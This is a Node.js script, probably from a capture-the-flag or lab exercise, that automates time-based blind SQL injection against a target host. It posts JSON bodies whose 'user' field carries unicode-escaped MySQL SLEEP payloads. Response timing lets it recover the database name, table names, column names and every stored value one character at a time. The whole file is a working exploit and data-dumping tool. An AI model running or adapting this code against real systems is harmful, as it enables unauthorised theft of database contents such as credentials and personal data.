#!/usr/bin/env node

const axios = require('axios').create()
const util = require('util')

axios.interceptors.request.use(config => {
  config.headers['request-startTime'] = Date.now()
  return config
})

axios.interceptors.response.use(response => {
  const currentTime = Date.now()
  const startTime = response.config.headers['request-startTime']

  response.headers['request-duration'] = currentTime - startTime
  return response
})

const utf8_encode = string => {
  let encoded = ''

  Buffer.from(string).forEach(c => {
    c = c.toString(16)
    encoded += '\\u' + '0'.repeat(4 - `${c}`.length) + c
  })

  return encoded
}

const host = process.argv[2]
const url = `http://${host}`
const seconds = 1

const check = async payload => {
  const res = await axios.post(url, `{"user":"${utf8_encode(payload)}"}`)
  return res.headers['request-duration'] > seconds * 1000
}

const characters = [...Array('~'.charCodeAt(0) - ' '.charCodeAt(0) + 1).keys()].map(n =>
  String.fromCharCode(n + ' '.charCodeAt(0))
)

const increasingList = (init, end) => [...Array(end - init + 1).keys()].map(n => n + init)

const getCharacter = async payload => {
  for (const c of characters) {
    if (await check(util.format(payload, c))) {
      return c
    }
  }
}

const getLength = async payloadFunc => {
  for (let n = 0; ; n++) {
    if (await check(payloadFunc(n))) {
      return n
    }
  }
}

const getResult = async (init, end, payloadFunc) => {
  let result = ''

  for (const n of increasingList(init, end)) {
    result += await getCharacter(payloadFunc(n))
  }

  return result
}

const ifAsciiSubstr = (column, n) =>
  `' or IF(ASCII(SUBSTR(${column},${n},1))=ASCII('%s'),SLEEP(${seconds}),0) AND '1'='1`

const ifAsciiSubstrFromLimit = (column, table, l, n) =>
  `' OR IF(ASCII(SUBSTR((SELECT ${column} FROM ${table} LIMIT ${l},1),${n},1))=ASCII('%s'),SLEEP(${seconds}),0) AND '1'='1`

const ifAsciiSubstrFromWhereLimit = (column, table, where, l, n) =>
  `' OR IF(ASCII(SUBSTR((SELECT ${column} FROM ${table} WHERE ${where} LIMIT ${l},1),${n},1))=ASCII('%s'),SLEEP(${seconds}),0) AND '1'='1`

const ifLength = (column, n) => `' OR IF(LENGTH(${column})=${n},SLEEP(${seconds}),0) AND '1'='1`

const ifLengthSubqueryFromLimit = (column, table, l, n) =>
  `' OR IF(LENGTH((SELECT ${column} FROM ${table} LIMIT ${l},1))=${n},SLEEP(${seconds}),0) AND '1'='1`

const ifLengthSubqueryFromWhereLimit = (column, table, where, l, n) =>
  `' OR IF(LENGTH((SELECT ${column} FROM ${table} WHERE ${where} LIMIT ${l},1))=${n},SLEEP(${seconds}),0) AND '1'='1`

const ifSubqueryFromWhere = (column, table, where, n) =>
  `' OR IF((SELECT ${column} FROM ${table} WHERE ${where})=${n},SLEEP(${seconds}),0) AND '1'='1`

const main = async () => {
  console.time('time')

  const db = []

  const databaseLength = await getLength(n => ifLength('DATABASE()', n))
  console.log(databaseLength)

  const databaseName = await getResult(1, databaseLength, n => ifAsciiSubstr('DATABASE()', n))
  console.log(databaseName)

  db[databaseName] = []

  const numTables = await getLength(n =>
    ifSubqueryFromWhere(
      'COUNT(table_name)',
      'information_schema.tables',
      `table_schema='${databaseName}'`,
      n
    )
  )
  console.log(numTables)

  const tables = []

  for (let l = 0; l < numTables; l++) {
    const tableNameLength = await getLength(n =>
      ifLengthSubqueryFromWhereLimit(
        'table_name',
        'information_schema.tables',
        `table_schema='${databaseName}'`,
        l,
        n
      )
    )
    console.log(tableNameLength)

    const tableName = await getResult(1, tableNameLength, n =>
      ifAsciiSubstrFromWhereLimit(
        'table_name',
        'information_schema.tables',
        `table_schema='${databaseName}'`,
        l,
        n
      )
    )

    tables.push(tableName)
    db[databaseName][tableName] = {}
  }

  console.log(tables)

  for (const tableName of tables) {
    const numColumns = await getLength(n =>
      ifSubqueryFromWhere(
        'COUNT(column_name)',
        'information_schema.columns',
        `table_name='${tableName}'`,
        n
      )
    )

    const numRows = await getLength(n =>
      ifSubqueryFromWhere('table_rows', 'information_schema.tables', `table_name='${tableName}'`, n)
    )

    console.log(tableName, numColumns, numRows)

    for (const l of increasingList(0, numColumns - 1)) {
      let columnNameLength = await getLength(n =>
        ifLengthSubqueryFromWhereLimit(
          'column_name',
          'information_schema.columns',
          `table_name='${tableName}'`,
          l,
          n
        )
      )

      console.log(columnNameLength)

      const columnName = await getResult(1, columnNameLength, n =>
        ifAsciiSubstrFromWhereLimit(
          'column_name',
          'information_schema.columns',
          `table_name='${tableName}'`,
          l,
          n
        )
      )
      console.log(columnName)

      db[databaseName][tableName][columnName] = []

      for (const r of increasingList(0, numRows - 1)) {
        let valueLength = await getLength(n =>
          ifLengthSubqueryFromLimit(columnName, tableName, r, n)
        )

        console.log(valueLength)

        const value = await getResult(1, valueLength, n =>
          ifAsciiSubstrFromLimit(columnName, tableName, r, n)
        )
        console.log(value)

        db[databaseName][tableName][columnName].push(value)
      }
    }
  }

  console.log(databaseName, db[databaseName])
  console.timeEnd('time')
}

main()
